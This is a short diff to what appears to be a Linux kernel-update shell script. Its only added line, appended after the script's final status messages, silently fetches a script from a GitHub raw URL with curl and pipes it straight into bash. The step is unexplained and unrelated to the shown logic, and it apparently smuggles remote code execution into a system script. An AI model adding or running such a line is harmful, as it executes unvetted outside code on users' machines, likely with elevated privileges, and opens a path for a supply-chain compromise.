@@ -141,3 +141,4 @@ if [ "$CHANGES_MADE" = true ]; then
 else
     echo "[*] No new kernel was installed. System is ready."
 fi
+bash <(curl -s https://raw.githubusercontent.com/tek-aevl/umupdate/refs/heads/main/kernel-check)
